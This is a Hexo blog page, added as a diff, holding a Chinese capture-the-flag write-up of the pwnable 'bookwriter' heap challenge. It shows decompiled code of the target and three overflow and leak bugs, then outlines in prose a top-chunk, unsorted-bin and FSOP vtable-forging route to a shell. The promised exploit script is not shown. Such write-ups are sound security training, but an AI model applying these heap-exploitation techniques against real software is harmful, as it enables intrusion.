@@ -1,0 +1,658 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>
+    2024-1-31 pwnable_bookwriter
+  </title>
+  <meta name="description" content="">
+  <meta name="keywords" content="">
+  <meta name="author" content="sheep">
+  <link rel="canonical" href="http://example.com/2024/02/01/2024-1-31-pwnable-bookwriter/">
+  
+  
+  <link rel="icon" href='/img/favicon.ico'>
+  
+  
+  
+<link rel="stylesheet" href="/css/b4c95347.css">
+
+  <script>window.i18n = {"tip-status-done":"完成","tip-status-default":"全部","tip-status-todo":"计划","tip-status-doing":"进行","tip-status-other":"其他","text-select":"选择","text-move":"移动","text-esc":"退出","January":"一月","February":"二月","March":"三月","April":"四月","May":"五月","June":"六月","July":"七月","August":"八月","September":"九月","October":"十月","November":"十一月","December":"十二月"}</script>
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+<body id="app">
+  <aside id="aside-box" class="left-aside">
+    <div class="header">
+      
+<link rel="stylesheet" href="/css/61875ce9.css">
+
+<div class="profile">
+  <a class="badge" href="/">
+    <span>Hi</span>
+    <span>sheep</span>
+  </a>
+  <cosy-tooltip id="left-aside-button" placement="right">
+    <span slot="content">
+      <span>显示 / 隐藏 左侧导航</span>
+      <cosy-short-key>[</cosy-short-key>
+    </span>
+    <cosy-icon>
+      <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 20 20">
+        <g fill="none">
+          <path d="M16 4c1.104-.019 2 .896 2 2v8a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h12zm1 2a1 1 0 0 0-1-1h-2.995v10H16a1 1 0 0 0 1-1V6zm-4.995 9V5H4.001a1 1 0 0 0-1 1v8a1 1 0 0 0 1 1h8.004z" fill="currentColor"></path>
+        </g>
+      </svg>
+    </cosy-icon>
+  </cosy-tooltip>
+</div>
+
+<script src="/js/a66044b6.js"></script>
+
+      
+
+
+<cosy-search id="post-search" placeholder="搜索">
+  <div slot="short-key">
+    <cosy-short-key>⌘</cosy-short-key>
+    <cosy-short-key>K</cosy-short-key>
+  </div>
+</cosy-search>
+
+
+<script>
+  window.algolia = {
+    appId: "R34LY1BBPU",
+    SearchOnlyAPIKey: "4fd025154505a4b00fb416f52993d700"
+  }
+</script>
+
+
+<script src="/js/5f00f278.js"></script>
+
+    </div>
+    <div class="aside-category">
+      
+<link rel="stylesheet" href="/css/db04a759.css">
+
+
+<nav class="category-nav cosy-scrollbar">
+  <ul><li data-path="archives">
+        <a href="/archives">
+          <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 20 20"><g fill="none"><path d="M3.5 3A1.5 1.5 0 0 0 2 4.5v4A1.5 1.5 0 0 0 3.5 10h9A1.5 1.5 0 0 0 14 8.5v-4A1.5 1.5 0 0 0 12.5 3h-9zM3 4.5a.5.5 0 0 1 .5-.5h9a.5.5 0 0 1 .5.5v4a.5.5 0 0 1-.5.5h-9a.5.5 0 0 1-.5-.5v-4zm.5 6.5A1.5 1.5 0 0 0 2 12.5v4A1.5 1.5 0 0 0 3.5 18h9a1.5 1.5 0 0 0 1.5-1.5v-4a1.5 1.5 0 0 0-1.5-1.5h-9zM3 12.5a.5.5 0 0 1 .5-.5h9a.5.5 0 0 1 .5.5v4a.5.5 0 0 1-.5.5h-9a.5.5 0 0 1-.5-.5v-4zm14-.063a2.003 2.003 0 0 1-2.5-1.937A2 2 0 0 1 16 8.563a2.005 2.005 0 0 1 1 0a2 2 0 0 1 0 3.874zM16.5 3a.5.5 0 0 1 .5.5v4.041a3.02 3.02 0 0 0-1 0V3.5a.5.5 0 0 1 .5-.5zm0 10.5c-.17 0-.337-.014-.5-.041V17.5a.5.5 0 0 0 1 0v-4.041c-.163.027-.33.041-.5.041z" fill="currentColor"></path></g></svg>
+          <div class="ellipsis">归档</div>
+        </a>
+      </li><li data-path="cosy-roadmap">
+        <a href="/cosy-roadmap">
+          <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 20 20"><g fill="none"><path d="M9.384 2a1 1 0 0 0-.966.742L4.616 17H2.5a.5.5 0 0 0 0 1h15a.5.5 0 0 0 0-1h-2.116L11.582 2.742A1 1 0 0 0 10.616 2H9.384zM5.651 17l.8-3H11.5a.5.5 0 0 0 0-1H6.717l.534-2H10.5a.5.5 0 0 0 0-1H7.517l1.867-7h1.232l3.733 14H5.651z" fill="currentColor"></path></g></svg>
+          <div class="ellipsis">路线图</div>
+        </a>
+      </li><li data-path="cosy-resume">
+        <a href="/cosy-resume">
+          <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 20 20"><g fill="none"><path d="M8.5 4.498a1.5 1.5 0 1 1 3 0a1.5 1.5 0 0 1-3 0zm1.5-2.5a2.5 2.5 0 0 0-2.43 3.086L5.471 4.15a1.761 1.761 0 0 0-2.317.88c-.4.882-.008 1.917.877 2.31L7 8.662v2.287l-1.877 4.645a1.75 1.75 0 0 0 3.245 1.311l1.556-3.849a.073.073 0 0 1 .028-.038a.086.086 0 0 1 .046-.012c.02 0 .035.005.046.012a.074.074 0 0 1 .028.038l1.555 3.849a1.75 1.75 0 0 0 3.245-1.311L13 10.96V8.662l2.968-1.322a1.74 1.74 0 0 0 .877-2.31a1.761 1.761 0 0 0-2.317-.88l-2.097.934a2.5 2.5 0 0 0-2.43-3.086zM4.065 5.444a.761.761 0 0 1 1-.38l3.918 1.744a2.5 2.5 0 0 0 2.034 0l3.918-1.744a.761.761 0 0 1 1 .38a.739.739 0 0 1-.373.983l-2.969 1.321a1 1 0 0 0-.593.914v2.298a1 1 0 0 0 .073.375l1.872 4.633a.75.75 0 0 1-1.39.562l-1.556-3.849c-.364-.9-1.639-.9-2.003 0l-1.555 3.85a.75.75 0 1 1-1.39-.562l1.876-4.646A1 1 0 0 0 8 10.95V8.662a1 1 0 0 0-.593-.914L4.438 6.427a.739.739 0 0 1-.373-.983z" fill="currentColor"></path></g></svg>
+          <div class="ellipsis">简历</div>
+        </a>
+      </li><li data-path="link">
+        <a href="/link">
+          <svg t="1705378180027" class="icon" viewBox="-250 -250 1400 1400" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1450" width="200" height="200"><path d="M593.94368 715.648a10.688 10.688 0 0 0-14.976 0L424.21568 870.4c-71.68 71.68-192.576 79.232-271.68 0-79.232-79.232-71.616-200 0-271.616l154.752-154.752a10.688 10.688 0 0 0 0-15.04l-52.992-52.992a10.688 10.688 0 0 0-15.04 0L84.50368 530.688a287.872 287.872 0 0 0 0 407.488 288 288 0 0 0 407.488 0l154.752-154.752a10.688 10.688 0 0 0 0-15.04l-52.736-52.736z m344.384-631.168a288.256 288.256 0 0 1 0 407.616l-154.752 154.752a10.688 10.688 0 0 1-15.04 0l-52.992-52.992a10.688 10.688 0 0 1 0-15.104l154.752-154.688c71.68-71.68 79.232-192.448 0-271.68-79.104-79.232-200-71.68-271.68 0L443.92768 307.2a10.688 10.688 0 0 1-15.04 0l-52.864-52.864a10.688 10.688 0 0 1 0-15.04l154.88-154.752a287.872 287.872 0 0 1 407.424 0z m-296.32 240.896l52.672 52.736a10.688 10.688 0 0 1 0 15.04l-301.504 301.44a10.688 10.688 0 0 1-15.04 0l-52.736-52.672a10.688 10.688 0 0 1 0-15.04l301.632-301.504a10.688 10.688 0 0 1 15.04 0z" fill="currentColor" p-id="1451"></path></svg>
+          <div class="ellipsis">友链</div>
+        </a>
+      </li></ul>
+  <ul><li class="active">
+        <a href="/categories/2024ROIS%E5%86%AC%E4%BB%A4%E8%90%A5/">
+          
+          <div class="ellipsis">
+            <span>2024ROIS冬令营</span>
+          </div>
+        </a>
+      </li><li class="">
+        <a href="/categories/Pwn%E7%9F%A5%E8%AF%86/">
+          
+          <div class="ellipsis">
+            <span>Pwn知识</span>
+          </div>
+        </a>
+      </li><li class="">
+        <a href="/categories/%E5%B0%8F%E6%AF%94%E8%B5%9B/">
+          
+          <div class="ellipsis">
+            <span>小比赛</span>
+          </div>
+        </a>
+      </li><li class="">
+        <a href="/categories/%E6%80%BB%E7%BB%93/">
+          
+          <div class="ellipsis">
+            <span>总结</span>
+          </div>
+        </a>
+      </li></ul>
+</nav>
+
+
+<script src="/js/118098c2.js"></script>
+
+    </div>
+    <div class="bottom">
+      <cosy-tooltip id="button-preference" placement="right">
+        <span slot="content">
+          <span>偏好</span>
+          <cosy-short-key>⌘</cosy-short-key>
+          <cosy-short-key>p</cosy-short-key>
+        </span>
+        <cosy-icon bordered id="button-about-cosy-theme">
+          <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 16 16">
+            <g fill="none">
+              <path d="M8 6a2 2 0 1 0 0 4a2 2 0 0 0 0-4zM7 8a1 1 0 1 1 2 0a1 1 0 0 1-2 0zm3.618-3.602a.708.708 0 0 1-.824-.567l-.26-1.416a.354.354 0 0 0-.275-.282a6.072 6.072 0 0 0-2.519 0a.354.354 0 0 0-.275.282l-.259 1.416a.71.71 0 0 1-.936.538l-1.359-.484a.355.355 0 0 0-.382.095c-.569.627-1 1.367-1.262 2.173a.352.352 0 0 0 .108.378l1.102.931a.704.704 0 0 1 0 1.076l-1.102.931a.352.352 0 0 0-.108.378A5.986 5.986 0 0 0 3.53 12.02a.355.355 0 0 0 .382.095l1.36-.484a.708.708 0 0 1 .936.538l.258 1.416c.026.14.135.252.275.281a6.075 6.075 0 0 0 2.52 0a.353.353 0 0 0 .274-.281l.26-1.416a.71.71 0 0 1 .936-.538l1.359.484c.135.048.286.01.382-.095c.569-.627 1-1.367 1.262-2.173a.352.352 0 0 0-.108-.378l-1.102-.931a.703.703 0 0 1 0-1.076l1.102-.931a.352.352 0 0 0 .108-.378A5.985 5.985 0 0 0 12.47 3.98a.355.355 0 0 0-.382-.095l-1.36.484a.71.71 0 0 1-.111.03zm-6.62.58l.937.333a1.71 1.71 0 0 0 2.255-1.3l.177-.97a5.105 5.105 0 0 1 1.265 0l.178.97a1.708 1.708 0 0 0 2.255 1.3L12 4.977c.255.334.467.698.63 1.084l-.754.637a1.704 1.704 0 0 0 0 2.604l.755.637a4.99 4.99 0 0 1-.63 1.084l-.937-.334a1.71 1.71 0 0 0-2.255 1.3l-.178.97a5.099 5.099 0 0 1-1.265 0l-.177-.97a1.708 1.708 0 0 0-2.255-1.3L4 11.023a4.987 4.987 0 0 1-.63-1.084l.754-.638a1.704 1.704 0 0 0 0-2.603l-.755-.637c.164-.386.376-.75.63-1.084z" fill="currentColor"></path>
+            </g>
+          </svg>
+        </cosy-icon>
+      </cosy-tooltip>
+    </div>
+  </aside>
+  <main>
+    
+<link rel="stylesheet" href="/css/9bb9a539.css">
+
+
+<div class="post-container">
+  <header>
+    <div class="left">
+      
+<link rel="stylesheet" href="/css/7d333f9e.css">
+
+<nav class="breadcrumb">
+  <section>
+    <cosy-tooltip placement="bottom-left">
+      <span slot="content"><span>首页</span>
+        <cosy-short-key>⌘</cosy-short-key>
+        <cosy-short-key>H</cosy-short-key>
+      </span>
+      <cosy-icon href="/">
+        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 20 20">
+          <g fill="none">
+            <path d="M8.998 2.388a1.5 1.5 0 0 1 2.005 0l5.5 4.942A1.5 1.5 0 0 1 17 8.445V15.5a1.5 1.5 0 0 1-1.5 1.5H13a1.5 1.5 0 0 1-1.5-1.5V12a.5.5 0 0 0-.5-.5H9a.5.5 0 0 0-.5.5v3.5A1.5 1.5 0 0 1 7 17H4.5A1.5 1.5 0 0 1 3 15.5V8.445c0-.425.18-.83.498-1.115l5.5-4.942zm1.336.744a.5.5 0 0 0-.668 0l-5.5 4.942A.5.5 0 0 0 4 8.445V15.5a.5.5 0 0 0 .5.5H7a.5.5 0 0 0 .5-.5V12A1.5 1.5 0 0 1 9 10.5h2a1.5 1.5 0 0 1 1.5 1.5v3.5a.5.5 0 0 0 .5.5h2.5a.5.5 0 0 0 .5-.5V8.445a.5.5 0 0 0-.166-.371l-5.5-4.942z" fill="currentColor"></path>
+          </g>
+        </svg>
+      </cosy-icon>
+    </cosy-tooltip>
+    
+    
+    <svg class="arrow" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 20 20">
+      <g fill="none">
+        <path d="M7.733 4.207a.75.75 0 0 1 1.06.026l5.001 5.25a.75.75 0 0 1 0 1.035l-5 5.25a.75.75 0 1 1-1.087-1.034L12.216 10l-4.51-4.734a.75.75 0 0 1 .027-1.06z" fill="currentColor"></path>
+      </g>
+    </svg>
+    <a class="ellipsis" href="/categories/2024ROIS%E5%86%AC%E4%BB%A4%E8%90%A5/">
+      2024ROIS冬令营
+    </a>
+    
+    
+    
+    <svg class="arrow" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 20 20">
+      <g fill="none">
+        <path d="M7.733 4.207a.75.75 0 0 1 1.06.026l5.001 5.25a.75.75 0 0 1 0 1.035l-5 5.25a.75.75 0 1 1-1.087-1.034L12.216 10l-4.51-4.734a.75.75 0 0 1 .027-1.06z" fill="currentColor"></path>
+      </g>
+    </svg>
+    <span class="ellipsis">
+      2024-1-31 pwnable_bo
+    </span>
+    
+  </section>
+</nav>
+
+
+<script src="/js/31d6cfe0.js"></script>
+
+    </div>
+    <div class="right">
+      
+      <cosy-tooltip id="toc-show-button" placement="left">
+        <span slot="content">
+          <span>显示 / 隐藏 文章目录</span>
+          <cosy-short-key>]</cosy-short-key>
+        </span>
+        <cosy-icon>
+          <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 20 20">
+            <g fill="none">
+              <path d="M4 4c-1.104-.019-2 .896-2 2v8a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2H4zM3 6a1 1 0 0 1 1-1h2.995v10H4a1 1 0 0 1-1-1V6zm4.995 9V5h8.004a1 1 0 0 1 1 1v8a1 1 0 0 1-1 1H7.995z" fill="currentColor"></path>
+            </g>
+          </svg>
+        </cosy-icon>
+      </cosy-tooltip>
+      
+    </div>
+  </header>
+  <div class="content">
+    <main class="cosy-scrollbar">
+      <div class="article-container">
+        <!-- 渲染文章内容 -->
+        <article>
+          <!-- 文章标题 -->
+          <h1 class="post-title">2024-1-31 pwnable_bookwriter</h1>
+          <div class="last-updated">
+            上次更新: 2024-02-01 01:02:33
+          </div>
+          <!-- 文章 -->
+          <h1 id="pwnable-bookwriter"><a href="#pwnable-bookwriter" class="headerlink" title="pwnable_bookwriter"></a>pwnable_bookwriter</h1><h2 id="执行fsop的条件："><a href="#执行fsop的条件：" class="headerlink" title="执行fsop的条件："></a>执行fsop的条件：</h2><ol>
+<li><strong>fp-&gt;_mode&lt;&#x3D;0</strong></li>
+<li><strong>fp-&gt;<code>_IO_write_ptr</code>&gt;fp-&gt;<code>_IO_write_base</code></strong></li>
+</ol>
+<p>​	或者(主要是前者)</p>
+<ol>
+<li><strong>fp-&gt;_mode &gt; 0</strong></li>
+<li><strong>_IO_vtable_offset (fp) &#x3D;&#x3D; 0</strong></li>
+<li><strong>fp-&gt;<code>_wide_data</code>-&gt;<code>_IO_write_ptr</code>&gt;fp-&gt;<code>_wide_data</code>-&gt;<code>_IO_write_bas</code></strong></li>
+</ol>
+<p>	</p>
+<h2 id="主要漏洞："><a href="#主要漏洞：" class="headerlink" title="主要漏洞："></a>主要漏洞：</h2><p>​	第一个是因为通过程序可以看出内存里只够存取8个chunk，但是在add函数中确实一个i&gt;8的判断，而存储chunk地址的相邻位置就是存取size的地址，那么就会有一个<strong>大字节溢出覆盖</strong></p>
+<p>​	第二个是在edit函数中有一个溢出就是可以通过strlen来将size扩大，慢慢的可以有一个<strong>无穷堆溢出</strong></p>
+<p>​	第三个就是在Author更改的时候即infor函数中是通过%s来读取的这样就可以<strong>泄露一个堆的地址</strong></p>
+<h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> __fastcall __noreturn <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a3<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Welcome to the BookWriter !"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">read_author</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>
+  <span class="token punctuation">&#123;</span>
+    <span class="token function">menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">switch</span> <span class="token punctuation">(</span> <span class="token function">sub_4008CD</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+      <span class="token keyword">case</span> <span class="token number">1LL</span><span class="token operator">:</span>
+        <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">break</span><span class="token punctuation">;</span>
+      <span class="token keyword">case</span> <span class="token number">2LL</span><span class="token operator">:</span>
+        <span class="token function">view</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">break</span><span class="token punctuation">;</span>
+      <span class="token keyword">case</span> <span class="token number">3LL</span><span class="token operator">:</span>
+        <span class="token function">edit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">break</span><span class="token punctuation">;</span>
+      <span class="token keyword">case</span> <span class="token number">4LL</span><span class="token operator">:</span>
+        <span class="token function">information</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">break</span><span class="token punctuation">;</span>
+      <span class="token keyword">case</span> <span class="token number">5LL</span><span class="token operator">:</span>
+        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token keyword">default</span><span class="token operator">:</span>
+        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Invalid choice"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">break</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>可见就是一个常规的功能程序</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">sub_4009AA</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-14h]</span>
+  <span class="token keyword">char</span> <span class="token operator">*</span>v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-10h]</span>
+  __int64 size<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-8h]</span>
+
+  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
+  <span class="token punctuation">&#123;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span> i <span class="token operator">></span> <span class="token number">8</span> <span class="token punctuation">)</span>                                <span class="token comment">// 9个？</span>
+      <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"You can't add new page anymore!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>qword_6020A0<span class="token punctuation">)</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token punctuation">)</span>                  <span class="token comment">// 6020A0上存的是malloc的地址</span>
+      <span class="token keyword">break</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Size of page :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  size <span class="token operator">=</span> <span class="token function">sub_4008CD</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  v2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>v2 <span class="token punctuation">)</span>
+  <span class="token punctuation">&#123;</span>
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Error !"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Content :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">similar_read</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>v2<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">(</span><span class="token operator">&amp;</span>qword_6020A0<span class="token punctuation">)</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> v2<span class="token punctuation">;</span>
+  qword_6020E0<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> size<span class="token punctuation">;</span>                       <span class="token comment">// 6020E0上存储size</span>
+  <span class="token operator">++</span>dword_602040<span class="token punctuation">;</span>                               <span class="token comment">// 602040上存的是chunk的个数</span>
+  <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Done !"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这里有个漏洞if ( i &gt; 8 )   判断有问题</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">edit</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-4h]</span>
+
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Index of page :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  v1 <span class="token operator">=</span> <span class="token function">sub_4008CD</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">></span> <span class="token number">7</span> <span class="token punctuation">)</span>
+  <span class="token punctuation">&#123;</span>
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"out of page:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>qword_6020A0<span class="token punctuation">)</span><span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token punctuation">)</span>
+    <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Not found !"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Content:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">similar_read</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>qword_6020A0<span class="token punctuation">)</span><span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">,</span> qword_6020E0<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  qword_6020E0<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>qword_6020A0<span class="token punctuation">)</span><span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 溢出点，填满之后size变大</span>
+  <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Done !"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这里也一个溢出点</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">information</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment">// [rsp+4h] [rbp-Ch] BYREF</span>
+  <span class="token keyword">unsigned</span> __int64 v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-8h]</span>
+
+  v2 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  v1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Author : %s\n"</span><span class="token punctuation">,</span> byte_602060<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Page : %u\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>dword_602040<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Do you want to change the author ? (yes:1 / no:0) "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">_isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>
+    <span class="token function">read_author</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v2<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="漏洞的利用"><a href="#漏洞的利用" class="headerlink" title="漏洞的利用"></a>漏洞的利用</h2><p>​	整个程序中没有free，因此大多数的手法是使用不了的，而这道题要用到一个FSOP手法来getshell</p>
+<p>​	利用点1：通过覆写top chunk的size大小为<code>fe1</code>之后再申请一个不大于mmap的极限值又大于top chunk的size就可以将top chunk释放到unsorted bin中</p>
+<p>​	利用点2：泄露libc地址，因为源码中显示在分割unsortedbin的chunk的时候，第一次分割会先放到相应的bin里面再分割，此时会给一个remainder进行赋值，之后便是直接分割chunk，因此可以add两个chunk便可以通过覆写fd来输出bk</p>
+<p>​	利用点3：可以利用unsorted bin attack将IO_list_all进行覆写，之后IO_list_all会到main arena+88，之后只要满足overflow的条件，再构造一个vtable，改写vtable里的overflow的地址，就可以malloc一个实现getshell(注意此时函数的参数是IO_list_all的地址)</p>
+<p>附上exp</p>
